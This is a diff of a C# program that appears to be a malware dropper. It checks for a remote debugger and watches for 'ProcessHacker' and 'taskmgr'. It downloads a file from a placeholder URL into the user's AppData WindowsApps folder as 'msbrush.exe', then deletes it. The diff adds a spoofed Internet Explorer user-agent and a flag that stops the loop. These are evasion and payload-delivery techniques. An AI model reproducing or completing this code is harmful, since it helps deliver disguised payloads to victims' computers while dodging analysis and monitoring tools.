@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -17,6 +17,7 @@ class Program
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
     private readonly static List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };
+    private static bool blocker = false;
 
     static void Main(string[] args)
     {
@@ -31,7 +32,8 @@ class Program
         {
 
             WebClient webClient = new WebClient();
-            webClient.DownloadFile("Enter URL", @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe");
+            webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " + "Windows NT 5.2; .NET CLR 1.0.3705 QatarArmedF;)");
+            webClient.DownloadFile("URL", @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe");
 
         }
         catch (WebException ex)
@@ -57,6 +59,7 @@ class Program
             Thread.Sleep(2000);
             string file = @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe";
             File.Delete(file);
+            blocker = true;
 
         }
         catch (WebException ex)
@@ -76,6 +79,10 @@ class Program
         {
             DP();
             Thread.Sleep(10);
+            if (blocker)
+            {
+                break;
+            }
         }
     }
 
